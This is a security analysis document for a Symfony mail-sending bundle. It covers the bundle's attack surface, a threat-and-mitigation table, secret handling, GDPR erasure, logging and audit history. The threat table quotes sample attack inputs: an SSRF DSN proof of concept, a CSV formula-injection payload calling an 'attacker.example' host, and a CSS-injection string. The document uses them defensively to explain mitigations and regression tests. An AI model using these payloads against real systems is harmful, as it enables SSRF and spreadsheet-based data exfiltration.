# Security

Bundle-specific security analysis. The short GitHub reporting policy lives in [`.github/SECURITY.md`](../.github/SECURITY.md).

## Table of contents

- [Scope](#scope)
- [Attack surface](#attack-surface)
- [Threat model and mitigations](#threat-model-and-mitigations)
- [Admin UI exposure and allow_unauthenticated](#admin-ui-exposure-and-allow_unauthenticated)
- [Secrets and cryptography](#secrets-and-cryptography)
- [Personal data (GDPR)](#personal-data-gdpr)
- [Logging](#logging)
- [Resource limits and timeouts](#resource-limits-and-timeouts)
- [CSRF](#csrf)
- [Dependencies and updates](#dependencies-and-updates)
- [Release security checklist (12.4.1)](#release-security-checklist-1241)
- [AI security audit (REQ-SEC-004)](#ai-security-audit-req-sec-004)
- [Residual risks and host guidance](#residual-risks-and-host-guidance)
- [Reporting a vulnerability](#reporting-a-vulnerability)

## Scope

Covers the `mailer` settings section (with its Resend provider fields since 1.3), DSN and sender validation (`MailerDsnValidator`, `DsnHostGuard`,
constraints), the runtime transport and mailer decorators, the test e-mail and Resend key check, the sent-mail log
(recorder, repository, entities, purge / forget commands), the admin UI (controller, filter form, access listener /
checker, route loader), readiness (Twig, AuthKit adapter), the optional branded e-mail layout and its CID images
(`BrandedEmailHelper`, spec 220 S7, since 1.4) and the configuration tree. It does **not** cover the host
firewall, Instance Settings' own storage, encryption and settings UI (see its SECURITY.md), the Symfony mailer
transports and provider bridges, or the content of the messages your application sends.

## Attack surface

| Input | Where | Notes |
| --- | --- | --- |
| DSN, sender, API key fields | Instance Settings section form / import (session, admin) | Validated by the field constraints on save **and** import; secrets encrypted at rest by Instance Settings. |
| Admin HTTP `GET` (session) | `…/log`, `…/log/{id}`, `…/log/{id}/body` | Access checker on every request under the prefix; UUID route requirement; `no-store`; `sort` / `dir` checked against a whitelist (never interpolated into DQL). |
| Admin HTTP `GET` (session) | `…/log/export` | Same access as the list plus optional `web_ui.export.access_roles`; formula-injection guard on every cell (`CsvSafeWriter`, best effort for common spreadsheets); `no-store`; capped at `web_ui.export.max_rows`; bodies only with `log.store_bodies` + `web_ui.export.include_bodies` + `?bodies=1`. |
| Admin HTTP `POST` (session) | `…/actions/test`, `…/actions/resend/check`, `…/actions/resend/test` | CSRF-only Form, MailKit access **and** Instance Settings section access, per-user rate limit for test e-mails. |
| Outbound SMTP / provider API | `RuntimeTransport` | Only to validated DSNs (scheme allow-list, host guard); framework `MAILER_DSN` fallback trusted. |
| Outbound HTTPS | `ResendApiChecker` → `https://api.resend.com/domains` | Fixed URL, deadline, no redirects. Called by "Check the API key" and, since 1.3, by a mailer save that would put a Resend key live (`ResendApiKeyAccepted`); both rate limited per user. |
| DNS | `DsnHostGuard` | Bounded child-process lookup (`dns_timeout`). |
| Message content | `SentMailRecorder` | Envelope always, bodies only with `log.store_bodies`; internal headers stripped before delivery. |
| CLI | `nowo:mail-kit:log:purge`, `…:log:forget`, `…:send-test` | Operator input (no session). |
| Brand (since 1.4) | `BrandedEmailHelper` ← `BrandProviderInterface` / `BrandAssetReaderInterface` (host or InstanceSettings) | Name and colours from the validated brand value objects; image **bytes** from the asset reader only (never fetched from the asset URL); attached as inline CID parts after type, header and size checks. |
| Outbound HTTPS (1.8, `graph.enabled`) | `GraphTokenProvider` → `login.microsoftonline.com/{tenant}/oauth2/v2.0/token`; `GraphApiClient` → `graph.microsoft.com/v1.0/users/{mailbox}/…`, upload session URLs | Fixed hosts; tenant / client id / mailbox validated before they reach a URL (and URL-encoded); token only to `graph.microsoft.com`; upload URLs only HTTPS:443 to `graph.upload_hosts`, without the token; no redirects; deadlines. |
| Graph mailbox credentials (1.8) | `GraphMailboxProviderInterface` (configured profiles from `%env()%`, or the host's port) | `GraphSecret` redacted in dumps, not serializable; never logged or put in an exception. |
| Inbound webhook (1.9, `graph.inbound.enabled`) | `POST graph.inbound.webhook.path` (public, stateless) | Validation token echoed as `text/plain` only when 1–1024 printable ASCII characters (`nosniff`, `default-src 'none'`); notifications need a stored subscription id and its client state (SHA-256 digests, `hash_equals`); body / batch caps and a global rate limit; only enqueues ids. |
| Inbound messages (1.9) | `GraphInboundProcessor` ← Graph message JSON and attachments | Untrusted sender content: capped JSON, sanitised HTML, attachments in capped temp streams with finfo-detected types and neutralised names; delta / next links followed only on Graph. |
| Configuration | `nowo_mail_kit.*` | Validated at compile time; switches must be literal booleans. |

## Threat model and mitigations

| Threat | Mitigation |
| --- | --- |
| **SSRF through the DSN query options** (CA M1: `?region=x@10.0.0.5:8443/` moved the Mailgun / SendGrid / SES API host) | Every query option is checked for every scheme: `region` only from a per-bridge allow-list (Mailgun `us` / `eu`, SendGrid `global` / `eu`, Scaleway `fr-par` / `nl-ams` / `pl-waw`, SES AWS region syntax; refused on other bridges), any other option value containing `@ / ? # : \\`, whitespace or control characters refused (credential options such as `session_token` may contain `/ + =`). Second line of defence: after the transport is built, its real endpoint host is read and must be a provider host (`*.mailgun.net`, `*.sendgrid.com`, `*.amazonaws.com`, `*.resend.com`, …) or pass the host guard. Regression tests replay the audit PoCs. |
| **SSRF through the DSN** (an admin points SMTP at an internal service or cloud metadata) | Host guard on every stored / provided DSN: cloud-metadata names and addresses always refused; `localhost`, `*.local`, `*.localhost`, `*.internal`, loopback, RFC 1918, CGNAT, link-local, unique-local, documentation and reserved ranges refused unless `allow_private_hosts` / `allowed_hosts`; host names resolved (A / AAAA) and refused when any answer is private or nothing resolves; IPv4 spellings normalised (OutboundUrlGuard `PrivateNetworkTarget`). Validation runs on save, on import, and before the transport is built at send time. |
| **Host command execution** (`sendmail://…?command=`, `native://`) | `sendmail`, `sendmail+smtp` and `native` are never accepted (not in the default list, refused in `allowed_schemes` at compile time). |
| **Silent mail loss** (`null://`) | `null` refused in the settings; a refused stored DSN fails the send (no silent fallback). |
| **Credential disclosure** | Transport failures are rethrown as `DeliveryFailedException`: a short message with a reference; API bridges answer "The mail provider answered HTTP <code>" — provider response bodies are never stored, flashed, printed or kept in the Messenger failure transport (no `previous`); the scrubbed detail is logged under the reference only. The scrubber masks the credentials of the DSN in use (user, password; raw, URL-encoded, base64), `username "…"`, `user:pass@`, `re_…`, `SG.…`, `xkeysib-…`, `key-…`, `Bearer …` and UUID tokens. DSN and API key are Instance Settings secrets (encrypted, never rendered back, sealed in exports); MailKit never logs or renders them: `MailerDsnAudit` labels (`scheme://host[:port]`), `[redacted]` invalid values in violations, `#[SensitiveParameter]` on DSN / key parameters, transport errors scrubbed (`user:pass@`, `re_…` keys, `Bearer …`) before they are stored, flashed or printed. |
| **Unauthorized access** | UI private by default (`ROLE_ADMIN`); empty role lists refused at compile time (pattern P1); a listener guards every request under the prefix and every bundle controller wherever it is mounted; actions also require the Instance Settings access of their section (its public `AccessGuard`); the token is trusted only when a firewall matched the main request. |
| **CSRF** | Every POST is a FormKit CSRF-only form (`csrf_only[_token]`, one token id per action); not submitted or invalid → 403. The container refuses to compile the UI without form CSRF or a token manager (pattern P2). |
| **Wrong Resend key taking every mail down** (MK-L1: with provider-dependent fields a new or rotated key, or a stored key never checked, could go live in the same save; password resets and magic links stop) | Since 1.3 a mailer save with `provider = resend` that would put a key live (typed key, or the stored key when switching from `dsn`) checks it with Resend first and is refused when Resend rejects it, the call fails or no key is stored; the current delivery keeps working. Admin form only: code, imports and the seed are trusted operator paths. The key is never echoed (violation invalid value `[redacted]`, messages carry the scrubbed Resend error only). |
| **Mail bombing / quota burn through the test action** | Per-user sliding-window rate limit, shared with the Resend key check (each check is an outbound call) (`test_email.rate_limit` per `rate_interval`, client address for anonymous demo access); recipient is the configured test recipient or the user's own address (no free-form recipient in the UI). |
| **Stored XSS through logged content** | Subjects, addresses, tags and errors are escaped by Twig; the text body is escaped in a `<pre>`; the HTML body is never inlined in the admin page — it is served alone with `Content-Security-Policy: default-src 'none'; img-src data:; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'; frame-ancestors 'self'; sandbox`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `no-store`. |
| **Injection** | ORM QueryBuilder / DBAL with bound parameters; LIKE patterns escaped (`!` escape); table names come from the configured prefix (validated `[A-Za-z0-9_]*`); the list / export sort is a key whitelist mapped to fixed DQL columns (`SentMailRepository::SORT_FIELDS`, unknown keys refused), never request text in `ORDER BY`. |
| **CSV / formula injection** (a subject or tag such as `=HYPERLINK("https://attacker.example",…)` run by a spreadsheet when an admin opens the export) | Every exported cell goes through ControllerKit's `CsvSafeWriter` (≥ 2.3.1): text starting with `=`, `+`, `-`, `@`, tab or CR gets a leading `'`, and a trigger after an embedded `;`, `,`, tab, `|` or line break gets a space (Excel in `;` list-separator locales splits cells there and ignores the quoting); RFC 4180 quoting; regression tests with formula payloads in subject and tag, also read with `;`. This is a best-effort guard for the common spreadsheets (Excel, LibreOffice, Google Sheets), not a guarantee for every CSV consumer: treat the file as untrusted data when another tool processes it. |
| **Bulk personal-data exfiltration through the export** | Same access as the log plus optional `web_ui.export.access_roles`; `max_rows` cap (10 000, at most 100 000); no bodies unless three explicit opt-ins; `no-store`; can be switched off (`web_ui.export.enabled: false`). |
| **Log write breaking delivery / host transactions** | Writes go through DBAL (never the host unit of work) and are best effort (warning on failure). |
| **Accidental route exposure** | The controller is not autoconfigured; routes come only from the `nowo_mail_kit` loader, groups switched off are not loaded (REQ-SF-004 rule 7, integration test). |
| **Demo configuration in production** | `security.allow_unauthenticated: true` is refused unless `kernel.debug` is true. The demo publishes its ports on `127.0.0.1` only and sends to Mailpit. |
| **Hostile brand image in an e-mail** (spec 220 S7: an uploaded logo whose bytes are SVG / HTML / a polyglot, or a huge image) | `BrandedEmailHelper` attaches only `logo_light`, `mark` and `extra.email_*`, and only when the bytes the reader returns start with the PNG, JPEG or WebP magic **and** `getimagesizefromstring()` reports the same type with both sides ≤ `brand.max_image_side` (4096). SVG and every other type are refused whatever the asset's origin (a committed config-default SVG is not attached either: mail clients do not render it and some webmails would). Bytes are never inlined into the HTML (no `data:` URI, no inline SVG); the image is an inline `DataPart` referenced as `cid:` only. Each image ≤ `brand.max_image_bytes` (512 KiB), all brand images of one e-mail ≤ `brand.max_total_bytes` (1 MiB). Tests: `testANonRasterUploadIsRefused`, `testAConfigDefaultSvgIsNotAttachedEither`, `testAHeaderThatDoesNotMatchItsMagicIsRefused`, `testSizeLimits`. |
| **SSRF / tracking through brand images** | The helper has no HTTP client and never reads `BrandAsset::$url`; bytes come only from the host's `BrandAssetReaderInterface` (InstanceSettings reads its database store and the hash-pinned default files). The layout prints only `cid:nowo-brand-…` references (re-checked by `nowo_mail_kit_brand()`), so no remote `<img src>` and no tracking pixel is added (owner decision Q-O6). |
| **XSS / CSS injection through the brand** | The layout is auto-escaped Twig (name in text, `alt` and `<title>`); colours reach `style` attributes only as `#rrggbb` from the contract's `BrandColors` (or the `#rrggbb`-validated `brand.colors` fallback) and are checked again before printing, so a value such as `red;}</style>` falls back to the default colour; image `src` must match `cid:nowo-brand-[a-z0-9-]+.(png\|jpg\|webp)` with integer sizes. The plain-text part prints the name through `nowo_mail_kit_plain_text` (control, bidi and line-separator characters removed) without HTML escaping. A configured fallback name is refused at compile time when it is blank, longer than 80 characters or contains control or bidi characters. |
| **Application attachment taken for the brand logo** (audit IW-L2: an attachment named `nowo-brand-logo-light.png` was reused as the header logo) | Only parts of the helper's own class `BrandedEmailPart` are reused or counted towards `brand.max_total_bytes`; when the application already attached a part with the brand name, the brand part is named `nowo-brand-<slot>-<12 random hex>.<ext>`, so Symfony's `cid:` resolution (first part with the name) cannot pick the other part. Test: `testAnApplicationAttachmentWithABrandNameIsNeverUsedAsTheLogo`. |
| **Brand breaking delivery** | Every provider, reader or image failure is caught and logged (slot and 12-character hash prefix, never the URL or bytes): the e-mail goes out with the configured name and colours and without the logo. `apply()` / `embed()` never throw because of the brand. |
| **Graph client secret or token disclosure** (1.8) | The secret is a `GraphSecret` (`__debugInfo()` = `[redacted]`, `__serialize()` refused, `#[SensitiveParameter]`); it is read only to build the token request body. Tokens live in the PSR-6 pool under a hashed key (tenant, client id, secret fingerprint) and in the `Authorization` header of Graph calls only. `GraphException` messages are built from fixed text, the status, a token-checked Graph / Entra error code and request id; Entra's `error_description` (which may echo identifiers), Graph error messages, URLs and bodies are dropped and no `previous` is kept. Logs: profile, operation, status, code, request id, counts. HttpLog (when it decorates `http_client`) records hosts and path templates, never bodies or query strings. |
| **SSRF / token leak through Graph answers** (1.8) | API calls are built from relative paths under `https://graph.microsoft.com/v1.0` (absolute URLs refused); the only URL taken from an answer is the upload session URL, which must be `https://` on port 443, without user info, to an exact `graph.upload_hosts` host — else the send fails before any byte is sent and the draft is deleted. Upload PUTs carry no `Authorization`. `max_redirects: 0` on every call. |
| **Header injection / hostile attachment metadata in Graph sends** (1.8) | Recipients validated (no CR / LF / `<>`), display names and subjects stripped of control characters, message ids validated (`local@domain`, ≤ 250 characters) and rendered by Symfony Mime's id headers; attachment names neutralised (`AttachmentFilename`: basename only, no control / bidi characters, no leading dots, ≤ 200 characters), content types limited to a `type/subtype` token, Content-IDs to RFC 5322 atom characters. |
| **Resource exhaustion in Graph sends** (1.8) | `graph.limits` (attachments per e-mail, bytes per attachment ≤ 150 MiB, bytes per e-mail) checked before any call; MIME part capped at 2.9 MB; large attachments streamed in 3.75 MiB chunks (memory bounded); a non-seekable stream is spooled to `php://temp` with a cap; deadlines on every call; throttling (429 / 503) reported with `retryAfter`, never retried in the request. |
| **Forged or replayed notifications** (1.9) | The endpoint is public by design (Graph sends no credentials), so every notification must name a stored, **unexpired** subscription of a profile still returned by `inboundProfiles()` and carry its `clientState`: a random 256-bit value generated per subscription, stored only as SHA-256 and compared in constant time (also for unknown ids), each subscription verified once per request. A forged notification with a valid client state could at most make MailKit fetch a message id **from the mailbox of that subscription**; ids are format-checked and idempotency makes replays no-ops. Abuse is bounded by the body / batch caps, a stop after 5 rejected items (403), a per-client-IP bucket for unverified traffic (`client_rate_limit`) separate from the bucket of verified requests (`rate_limit`), and an optional source allow-list (`allowed_ips`). Responses carry no data. **Residual:** the validation echo answers any well-formed token (harmless text/plain); restricting it to a subscription create in flight needs a cache shared by all instances and is not done. |
| **Reflected content through the validation echo** (1.9) | Only printable ASCII, at most 1024 characters, served as `text/plain; charset=utf-8` with `X-Content-Type-Options: nosniff`, `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'` and `no-store`. |
| **Hostile HTML in inbound mail** (1.9) | symfony/html-sanitizer with the safe element / attribute lists: no script, style, iframe, object, form or event handler, no `style` attribute, links http(s) / mailto only (+ `rel="noopener noreferrer nofollow"`), no relative URLs, images `cid:` only by default (no tracking pixels); input cut at `limits.max_html_bytes`. The host still renders it in a sandboxed / CSP-restricted view. |
| **Hostile attachments** (1.9) | Never trusted by declared type or name: dangerous extensions (`html`, `htm`, `xhtml`, `svg`, `js`, `mjs`, `php*`, `phar`, `hta`, `exe`, `bat`, `cmd`, `ps1`, `scr`, `jar`, `lnk`, `vbs`, `msi`, `com`, `dll`, macro-enabled Office … — `InboundFileTypes::DANGEROUS_EXTENSIONS`) are rejected without being downloaded; the first 64 KiB of the others are checked with finfo and the detected type must match `limits.allowed_types` (default: PDF, common images, plain text / CSV, Office and OpenDocument documents — no HTML, SVG, scripts, executables or archives; `application/zip` only when a host adds it); `InboundAttachment::$safeFilename` carries the extension of the detected type. Size / count / total caps (declared size first, download capped again); bytes in `php://temp` streams closed after the handler; names neutralised. Item / reference attachments are not read. **Residual:** archives and legacy Office files a host allows are not scanned inside (no antivirus); serve stored files with the detected type, `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`. |
| **SSRF through Graph links** (1.9) | `@odata.nextLink` / `@odata.deltaLink` (and a stored link) are followed only when `https://graph.microsoft.com/v1.0/users/{the profile's mailbox}/…` on port 443 without user info or fragment; anything else fails before a request is sent. |
| **Spoofed sender verdicts** (1.9) | SPF / DKIM / DMARC are read from the first `Authentication-Results` header only when Exchange marked the message as received from outside (`X-MS-Exchange-Organization-AuthAs: Anonymous`); otherwise null. They are a coarse spam signal, not a user authentication; neither is a plus-address tag (anyone can write to `projects+t-42@…`). Hosts decide with their own contact rules. |
| **Oversized messages** (1.9) | Over `limits.max_message_bytes` the message is handed over without body or headers (`oversized`), so it is neither lost nor retried forever. |
| **Duplicate processing / lost messages** (1.9) | Claims by SHA-256(profile, internetMessageId) in the bundle table (unique key; savepoint in an open host transaction); a host exception releases the claim; a crashed claim is taken over after `stale_claim_seconds`. |
| **Cross-request state leaks (FrankenPHP worker)** | Only the transport for the last DSN is kept, reset on `kernel.reset` and on settings changes; see [FRANKENPHP-WORKER-AUDIT.md](FRANKENPHP-WORKER-AUDIT.md). |

## Admin UI exposure and allow_unauthenticated

The log shows who received what: keep `web_ui.path_prefix` behind the firewall (`access_control`) **and** the bundle
checker. `security.allow_unauthenticated: true` is a demo / local switch only; the container refuses it without
`kernel.debug`, but never set it in a shared or staging environment either. Restrict the mail sections in Instance
Settings (`nowo_instance_settings.security.area_roles: { mailer: [ROLE_SUPER_ADMIN] }`; since 1.3 the Resend fields and actions are part of `mailer`, and with `resend.enabled` an `area_roles.resend` entry fails the build so it cannot be silently ignored)
when not every admin may change the transport.

## Secrets and cryptography

- `mailer.dsn` and `mailer.resend_api_key` (`resend.api_key` before 1.3) are Instance Settings secret fields: encrypted at rest with DoctrineEncryptBundle,
  never sent back to the browser, exported only sealed. MailKit adds no cryptography of its own.
- A hidden provider row (1.3 `visible_when`) keeps its stored secret; only an explicit "clear" removes it. After the
  1.3 migration the 1.2 `resend` rows (the old encrypted key included) stay in the table unread until
  `nowo:mail-kit:purge-legacy-resend` deletes them (only once copied; [UPGRADING](UPGRADING.md#to-130)). While they
  are pending, the old key is never sent to the browser: the page only marks it as stored.
- The decrypted DSN lives in memory only while a transport is built and in the cached transport object.
- Graph (1.8): the client secret comes from `%env()%` (configured profiles) or the host's mailbox port per send and is
  not kept by any MailKit service. App-only access tokens (bearer, about one hour) are cached in `graph.token_cache`
  (`cache.app` by default, i.e. on the filesystem or the app's cache backend): use an encrypting marshaller on shared
  caches. Restrict the app to the mailbox with an application access policy and rotate the secret as described in
  [MICROSOFT-GRAPH-SETUP.md](MICROSOFT-GRAPH-SETUP.md).
- Fixtures and the demo use obvious placeholders (`REDACTED-TEST`, `REDACTED-DEMO`); the demo key is generated at
  start and ignored by git.

## Personal data (GDPR)

- The sent-mail log stores recipients' addresses and subjects (needed to answer "was it sent?"). Bodies are **off by
  default** (`log.store_bodies: false`); when on, use `MailHeaders::redact()` for one-time links and codes.
- Retention: `nowo:mail-kit:log:purge` (default `log.retention_days: 30`) — schedule it.
- Erasure: `nowo:mail-kit:log:forget <email>` / `SentMailRecorder::forgetAddress()` deletes every row (and body) the
  person sent or received — since 1.7 a row that other recipients share is unlinked instead (address removed, sender
  masked) — (to, cc, bcc, sender — matched on a normalised `recipient_index` column, so it works the same
  on SQLite, MySQL / MariaDB and PostgreSQL, also for addresses with `/` or non-ASCII characters) and masks the address
  in the subjects and stored bodies of the other rows (also URL-encoded). Internationalised addresses are accepted.
  Call it from your account-deletion flow. Not covered: copies outside the log (provider dashboards, mailboxes).
- `log.enabled: false` disables the log entirely.
- **CSV export** (`web_ui.export`, on by default for whoever opens the log): a downloaded file is a copy outside the
  retention purge and the erasure command. Limit it with `web_ui.export.access_roles`, keep `include_bodies` off, and
  record in your processing register who may export and how long files are kept. Bodies need three explicit opt-ins
  (`log.store_bodies`, `web_ui.export.include_bodies`, `?bodies=1`). Errors are scrubbed again on export.

## Logging

- `notice` "Mail settings changed." — section, field names, origin, redacted new transport, readiness.
- `warning` "Mail delivery failed." — redacted transport label and exception class (the message goes to the log row,
  scrubbed).
- `info` / `warning` test e-mail, Resend check (domain count / HTTP status), purge (days, count), erasure (count only).
- `warning` "Sent-mail log insert / update failed." — exception class only.
- Never logged: DSNs, passwords, API keys, message bodies, recipient addresses.
- `warning` "Mail delivery failed." carries a `reference` and a `detail`: the scrubbed transport message, which **may
  contain a provider response body** (with the known credential formats masked). Treat the application log as
  confidential; the body never reaches the sent-mail log, the flash, the CLI or the Messenger failure transport.

## Resource limits and timeouts

- DNS lookup per DSN host: `dsn.dns_timeout` (2 s), on save / import and when the transport for a DSN is built
  (once per DSN per worker until `kernel.reset` / a settings change). The readiness check (`isOutboundMailReady()`,
  AuthKit login page) never resolves DNS: syntax and configuration only.
- Resend key check: `resend.api_timeout` (10 s connect + total), `max_redirects: 0` — also during a mailer save that
  switches to / rotates the Resend key (the save waits for it).
- SMTP / provider sends: Symfony transport timeouts (DSN `timeout` option); keep them below PHP `max_execution_time`
  ([CONFIGURATION — Timeouts](CONFIGURATION.md#timeouts-req-runtime-001)).
- Stored bodies capped at 1 MiB each, errors at 2 000 characters, search at 120 characters, list pages at
  `web_ui.page_size` (≤ 200); purge in keyset batches; CSV export streamed (one row hydrated at a time; bodies loaded
  in chunks of about `web_ui.export.body_batch_bytes`, 8 MiB, instead of 100 rows of up to 2 MiB each) and capped at
  `web_ui.export.max_rows` (10 000, at most 100 000). On MySQL / MariaDB `pdo_mysql` buffers the whole row result in
  the client before the first line is written (a few KiB per row), so the peak memory of an export grows with
  `max_rows`; the connection is not switched to unbuffered mode because the body queries run while the rows are read.
  A fatal error in the middle of the stream leaves a partial file with status 200 (headers already sent).

## CSRF

Applies (session-authenticated admin mutations): FormKit CSRF-only forms on every POST action, fail-closed container
check, no `csrf_protection: false` on mutation forms (only the idempotent GET filter form has none). The CLI has no
session and no CSRF. The CSV export is a GET read with no side effect (same as the filters): no CSRF token; a forged
cross-site link can only make the admin's own browser download what it may already read, never cached (`no-store`).

## Dependencies and updates

- Runtime dependencies: Symfony components (mailer, form, validator, security-csrf, rate-limiter, http-client…),
  Doctrine, Instance Settings, UiKit, FormKit, OutboundUrlGuard, Twig Extra. CI runs `composer audit --locked` on every
  matrix cell; Dependabot groups Composer, npm (demo e2e) and GitHub Actions updates.
- Security fixes are released as patch versions and noted in the changelog.

## Release security checklist (12.4.1)

| Item | How it is satisfied |
| --- | --- |
| SECURITY.md | This document + `.github/SECURITY.md`. |
| `.env` in `.gitignore` | Root and demo `.gitignore` exclude `.env`, `.env.local`, `.env.dev`, key files. |
| No secrets | Placeholders only in fixtures and demo; test DSNs built from `REDACTED-TEST`. |
| Safe config / recipe | Recipe ships `ROLE_ADMIN`, `allow_unauthenticated: false`, no bodies, the `access_control` reminder. |
| Input / output | DSN / sender constraints, UUID requirements, Twig escaping, sandboxed HTML body. |
| Dependencies | `composer audit --locked` in CI. |
| No-secret logs | See [Logging](#logging). |
| Outbound I/O | SSRF host guard, scheme allow-list, fixed Resend URL, deadlines. Brand images: no fetch at all (asset reader only). |
| Permissions / exposure | Opt-in routes, roles, section access for actions, firewall-only token trust, fail-closed compile checks. |
| Limits / DoS | Rate limit, pagination, capped bodies and errors. |
| AI security audit (REQ-SEC-004) | Appendix CA: Pass (good) / Low after re-verification on `de7dbbd` — see below. Branded e-mails (1.4, spec 220 S7): **re-verified (Delta IW-C **Pass**; IW-I12 Info: a host part renamed with `setName()` before `apply()` can still win the `cid:`, follow-up)**. |

## AI security audit (REQ-SEC-004)

| Date | Revision | Auditor | Grade | Findings |
| --- | --- | --- | --- | --- |
| 2026-10-31 | `e30bcb9` (PR #1) | Independent AI audit, Appendix CA | **Pass (conditional) / Medium** | M1 SSRF through provider `region` options; L1 DNS on every readiness check; L2 erasure / search missed rows (JSON escaping, PostgreSQL, IDN); L3 credentials echoed in errors, provider bodies kept; Info I1–I10 |
| 2026-10-31 | `de7dbbd` (PR #3) | Independent re-verification, Appendix CA | **Pass (good) / Low** | M1 held against 46 bypass cases; follow-ups N1 (unreachable API → raw HttpClient exception), N2 (SES / Scaleway DSNs refused), R1–R3 (erasure index separator, IDN forms, collations), info (insecure TLS option, SES regex anchor) |
| 2026-10-31 | branch `fix/ca-followup` | Fixes of N1, N2, R1, R2, the info items; R3 documented | — | — |

| 2026-11-09 | `acd2d3d` (PR #12) | Independent batch audit, Appendix IW (section C) | **Pass-Low** | IW-L2 (an application attachment named like a brand part was reused as the logo); Info IW-I9 to IW-I11 (I11: queued messages carry the image parts, documented) |
| Unreleased (1.4) | branch `feat/brand-s7` | IW-L2 fix (`BrandedEmailPart`, unique part name on a clash) | **Re-verification pending** | — |

Recorded in the monorepo `BUNDLES_SECURITY_ANALYSIS.md` (Appendix CA). Current grade: **Pass (good) / Low**; the 1.4
brand surface is **re-verified (Delta IW-C **Pass**; IW-I12 Info: a host part renamed with `setName()` before `apply()` can still win the `cid:`, follow-up)**.

## Residual risks and host guidance

- **I9 — DNS rebinding / TOCTOU.** The host is resolved when the DSN is validated; the transport resolves it again when it
  connects. A host that changes its answer after validation could still reach a private address. Use IP-literal or
  provider DSNs for strict environments, or an egress firewall.
- **`allowed_hosts` / `allow_private_hosts`** turn the guard off for those hosts: list only relays you operate.
  Single-label names (`mailpit`, `redis`) are refused unless allow-listed, with or without `resolve_dns` (CA I2);
  `allow_private_hosts: true` accepts them.
- **I5 — HTML body viewer.** The stored HTML body is served alone with a sandboxing CSP (no script, no forms, no remote
  loads); a click on a link inside it still navigates the tab (normal for an e-mail viewer).
- **I6 — test e-mail content.** The test e-mail names the redacted transport (`smtp://host:port`) and goes to the
  configured test recipient, which any admin of the section may set to an external address (rate-limited, fixed
  content).
- **I8 — demo tooling.** The Playwright screenshot converter (`sharp`, dev only, not shipped) may carry upstream
  image-library advisories; it never processes untrusted images.
- **R3 — case and accent folding.** Subject / body erasure matches with SQL `LOWER()`: on SQLite it folds ASCII only (an
  upper-case non-ASCII address in a subject may survive the masking — the rows addressed to the person are still deleted
  through the normalised index), and MySQL / MariaDB accent-insensitive collations (`*_ai_ci`) may match more rows than
  the exact address (`jose@` also matches `josé@`): erasure then deletes / masks more, never less.
- **TLS checks.** `verify_peer=0` / `verify_peer_name=0` in a stored DSN are refused unless `dsn.allow_insecure_tls: true`
  (development only).
- **I10 — log visibility.** Every user who passes the MailKit access checker sees every log row (an admin log, no
  per-row ownership); Instance Settings `area_roles` for `mailer` restrict the settings, not the log — use
  `security.access_roles` / `access_checker` for that.
- **Admins choose the transport.** A user who may edit the `mailer` section can route all mail (including password
  resets) through a server they control. Restrict the section with Instance Settings `area_roles` and audit the
  `Mail settings changed.` notices.
- **Framework fallback.** `MAILER_DSN` is not validated (ops configuration).
- **Recipients in the log** are personal data even without bodies: protect the UI, purge, honour erasure requests.
- **Brand images are only as trustworthy as the reader.** The helper trusts the bytes `BrandAssetReaderInterface`
  returns for the asset it was given (its type and size are checked, not its content beyond the header). A host reader
  must read only its own stored or committed files, never fetch a URL. WebP is attached as is; some clients (older
  Outlook) do not display it, so upload PNG or JPEG logos for e-mail.
- **`apply()` without the layout.** `BrandedEmailHelper::apply()` attaches the logo part even when the e-mail's
  template does not reference it; mail clients then show it as an attachment. Use it only with templates that extend
  the branded layout, or call `embed()` for the images a template prints.

## Reporting a vulnerability

Please follow [`.github/SECURITY.md`](../.github/SECURITY.md) — do not open a public issue.
